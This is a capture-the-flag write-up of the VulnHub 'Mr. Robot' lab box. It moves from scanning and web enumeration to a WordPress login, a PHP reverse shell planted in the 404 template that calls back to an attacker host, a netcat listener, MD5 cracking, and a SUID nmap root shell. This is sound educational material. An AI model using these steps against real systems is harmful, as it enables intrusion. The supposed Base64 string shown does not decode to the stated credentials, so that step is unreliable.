# 🤖 Mr. Robot CTF: Full Writeup

![CTF](https://img.shields.io/badge/CTF-Mr.Robot-red?style=for-the-badge&logo=linux)
![Platform](https://img.shields.io/badge/Platform-VulnHub-blue?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted%20✓-brightgreen?style=for-the-badge)

> A complete penetration testing walkthrough of the **Mr. Robot** VulnHub machine: inspired by the TV show *Mr. Robot*. This box covers web enumeration, hash cracking, WordPress exploitation, and privilege escalation via SUID nmap.

---

## 📋 Table of Contents

- [Machine Info](#machine-info)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Initial Access](#initial-access)
- [Reverse Shell](#reverse-shell)
- [Privilege Escalation](#privilege-escalation)
- [Root](#root)
- [Flags Summary](#flags-summary)
- [Tools Used](#tools-used)

---

## 🖥️ Machine Info

| Field       | Details                  |
|-------------|--------------------------|
| Name        | Mr. Robot                |
| Platform    | VulnHub                  |
| IP          | 192.168.211.130          |
| OS          | Linux                    |
| Difficulty  | Medium                   |
| Keys        | 3 flags (key-1, key-2, key-3) |

---

## 🔍 Reconnaissance

### Step 1: Discover Own IP

```bash
ip a
```

Identified attacker machine IP: `192.168.211.129`

---

### Step 2: ARP Scan (Host Discovery)

```bash
sudo arp-scan -l
```

**Results:**

| IP Address       | Role               |
|------------------|--------------------|
| 192.168.211.1    | Main Gateway       |
| 192.168.211.2    | VM Gateway         |
| 192.168.211.130  | **Target Server**  |
| 192.168.211.254  | Exit Gateway       |

---

### Step 3: Port Scan with Nmap

```bash
nmap -p- --min-rate 10000 192.168.211.130
```

**Open Ports:**

| Port    | State  | Service |
|---------|--------|---------|
| 22/tcp  | Closed | SSH     |
| 80/tcp  | Open   | HTTP    |
| 443/tcp | Open   | HTTPS   |

---

## 🌐 Web Enumeration

### Step 4: Visit Target in Browser

Navigated to `http://192.168.211.130`: discovered an interactive Mr. Robot themed webpage with available commands:

```
prepare / fsociety / inform / question / wakeup / join
```

---

### Step 5: Directory Brute Force with DIRB

```bash
dirb http://192.168.211.130/ /usr/share/wordlists/dirb/common.txt
```

**Interesting directories found:**

```
/admin/
/blog/
/dashboard
/feed/
/images/
/intro
/license       ← 🔑 Important!
/wp-login.php
```

---

### Step 6: Inspect `/license` Endpoint

Browsed to `http://192.168.211.130/license`

Found a **Base64-encoded string** at the bottom of the page:

```
ZWxsaW90OlER28-0652
```

---

### Step 7: Decode the Hash

Used **hashes.com** to decode the Base64 string.

**Result:**
```
elliot : ER28-0652
```
> Username: `elliot` | Password: `ER28-0652`

---

## 🔓 Initial Access

### Step 8: Login to WordPress

Navigated to `http://192.168.211.130/wp-login.php`

Logged in successfully with credentials:
- **Username:** `elliot`
- **Password:** `ER28-0652`

---

## 🐚 Reverse Shell

### Step 9: Generate PHP Reverse Shell

Used **revshells.com** → selected **PHP PentestMonkey** shell.

Set attacker IP and port:
```php
$ip = '192.168.211.129';
$port = 5555;
```

---

### Step 10: Inject Shell via WordPress Theme Editor

1. Went to **Appearance → Editor**
2. Selected **404 Template (404.php)**
3. Replaced content with the PHP reverse shell code
4. Clicked **Update File**

---

### Step 11: Start Listener & Trigger Shell

```bash
nc -lvp 5555
```

Triggered the shell by browsing to a non-existent page: connection received!

```bash
$ whoami
daemon
```

---

## ⬆️ Privilege Escalation

### Step 12: Find Key Files

```bash
cd /home
ls
# robot
cd robot
ls
# key-2-of-3.txt
# password.raw-md5
```

---

### Step 13: Read the MD5 Hash

```bash
cat password.raw-md5
```

Output:
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Decoded with an online MD5 cracker:
```
c3fcd3d76192e4007dfb496cca67e13b → abcdefghijklmnopqrstuvwxyz
```

---

### Step 14: Upgrade Shell & Switch User

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
su - robot
# Password: abcdefghijklmnopqrstuvwxyz

$ whoami
robot
```

---

### Step 15: Find SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

**Key finding:** `/usr/local/bin/nmap` has SUID bit set!

---

## 👑 Root

### Step 16: Exploit SUID nmap for Root Shell

```bash
cd /usr/local/bin
./nmap --interactive
```

Inside nmap interactive mode:
```
nmap> !/bin/bash -p
```

```bash
bash-4.3# whoami
root
```

> **Rooted! 🎉**

---

## 🏁 Flags Summary

| Flag    | Location                        | Notes              |
|---------|---------------------------------|--------------------|
| Key 1   | `http://192.168.211.130/key-1-of-3.txt` | Found via web      |
| Key 2   | `/home/robot/key-2-of-3.txt`   | Read as user robot |
| Key 3   | `/root/key-3-of-3.txt`         | Read as root       |

---

## 🛠️ Tools Used

| Tool          | Purpose                          |
|---------------|----------------------------------|
| `nmap`        | Port scanning                    |
| `arp-scan`    | Host discovery                   |
| `dirb`        | Web directory brute-force        |
| `revshells.com` | PHP reverse shell generator    |
| `hashes.com`  | Hash decoding / cracking         |
| `netcat (nc)` | Listener for reverse shell       |
| `python pty`  | Shell upgrade                    |

---

## 📚 Key Takeaways

- Always enumerate web directories: hidden endpoints can leak credentials
- WordPress theme editor can be abused for RCE if admin access is obtained
- SUID binaries (especially `nmap`) can be leveraged for privilege escalation
- Never store passwords in plain-text or weak MD5 hashes

---

## ⚠️ Disclaimer

> This writeup is for **educational purposes only**. All testing was performed on a local virtual machine in a controlled lab environment. Never attempt these techniques on systems you do not own or have explicit permission to test.

---

*Made with ❤️ | Happy Hacking!*
